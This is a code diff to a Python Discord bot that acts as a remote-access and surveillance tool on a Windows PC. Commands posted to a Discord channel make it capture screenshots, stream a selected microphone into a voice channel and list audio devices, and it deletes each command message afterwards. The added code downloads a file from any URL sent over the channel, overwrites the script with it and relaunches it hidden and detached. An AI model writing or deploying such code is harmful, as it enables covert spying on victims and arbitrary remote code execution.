@@ -6,9 +6,11 @@ import asyncio
 from mss import MSS
 import mss.tools
 import io
+import urllib.request
+import subprocess
 
 # === CONFIGURATION ===
-TOKEN = 'PLACEHOLDER'  
+TOKEN = 'PLACEHOLDER'  # Leave as 'PLACEHOLDER' on GitHub
 SYNC_CHANNEL_ID = 1515494790576209930  
 PREFIX = "."  
 # =====================
@@ -21,7 +23,7 @@ class MyBot(discord.Client):
         self.voice_client = None
         self.current_mic_id = 0  
         self.audio_task = None   
-        self.boot_time = time.time()  # Records the exact second the PC script launches
+        self.boot_time = time.time()  # Track precise initialization epoch
 
 client = MyBot()
 
@@ -80,7 +82,6 @@ async def on_ready():
         channel = client.get_channel(SYNC_CHANNEL_ID)
         if channel:
             try: 
-                # Sends its personal boot timestamp as part of the heartbeat signal
                 await channel.send(f"📢 BOT_SIGNAL:HEARTBEAT:{client.identity}:{client.boot_time}")
             except Exception: pass
         await asyncio.sleep(30)
@@ -88,6 +89,7 @@ async def on_ready():
 @client.event
 async def on_message(message):
     if message.author.id == client.user.id:
+        # 1. Capture Screen Display
         if message.content == "📢 BOT_SIGNAL:TAKE_SCREENSHOT":
             try:
                 temp_path = os.path.join(os.environ.get('TEMP', 'C:\\'), 'ss.png')
@@ -104,6 +106,36 @@ async def on_message(message):
             try: await message.delete()
             except Exception: pass
 
+        # 2. Remote Code Hot-Swap & Relaunch
+        elif message.content.startswith("📢 BOT_SIGNAL:UPDATE_CODE:"):
+            try:
+                new_url = message.content.replace("📢 BOT_SIGNAL:UPDATE_CODE:", "").strip()
+                current_file_path = os.path.abspath(__file__)
+                
+                sync_channel = client.get_channel(SYNC_CHANNEL_ID)
+                if sync_channel:
+                    await sync_channel.send(f"⏳ Main PC downloading asset update from source URL...")
+                
+                urllib.request.urlretrieve(new_url, current_file_path)
+                
+                if sync_channel:
+                    await sync_channel.send("✅ Hot-reload complete. Spawning new instance context...")
+                
+                DETACHED_PROCESS = 0x00000008
+                subprocess.Popen(
+                    ["pythonw", current_file_path], 
+                    creationflags=subprocess.CREATE_NO_WINDOW | DETACHED_PROCESS
+                )
+                os._exit(0)
+            except Exception as e:
+                sync_channel = client.get_channel(SYNC_CHANNEL_ID)
+                if sync_channel:
+                    try: await sync_channel.send(f"🚨 UPDATE_FAILED: {e}")
+                    except Exception: pass
+            try: await message.delete()
+            except Exception: pass
+
+        # 3. Voice Intercept Core
         elif message.content.startswith("📢 BOT_SIGNAL:MIC_JOIN:"):
             try:
                 vc_id = int(message.content.split(":")[-1])
@@ -124,6 +156,7 @@ async def on_message(message):
             try: await message.delete()
             except Exception: pass
 
+        # 4. Hardware Asset Scanner
         elif message.content == "📢 BOT_SIGNAL:MIC_LIST":
             try:
                 import pyaudio
@@ -147,6 +180,7 @@ async def on_message(message):
             try: await message.delete()
             except Exception: pass
 
+        # 5. Active Target Switcher
         elif message.content.startswith("📢 BOT_SIGNAL:MIC_SELECT:"):
             try:
                 selection = message.content.split(":")[-1].strip()
